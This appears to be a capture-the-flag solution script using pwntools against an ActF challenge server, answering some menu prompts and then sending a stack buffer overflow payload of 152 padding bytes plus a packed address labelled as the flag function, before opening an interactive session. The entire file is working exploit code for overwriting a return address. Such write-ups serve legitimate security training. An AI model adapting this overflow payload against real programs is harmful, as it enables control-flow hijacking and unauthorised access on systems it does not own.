#!/usr/bin/env python2

'''
NOTES:
Pattern found offset at 152 and 216

'''
from pwn import *

conn = remote('shell.actf.co',19305)

#solve useless struct construction
conn.sendline('3')
conn.sendline('3')
conn.sendline('3')
conn.sendline('1')
conn.sendline('1')
conn.sendline('1')
#conn.send(cyclic(512))


#payload 
payload = ''

#either offset 152 or 216
#add junk into stack overwriting rbp
payload += 'A'*152
###payload += 'A'*216

#pack the address the flag function
payload += p64(0x4011b6)

#send payload
conn.sendline(payload)

conn.interactive()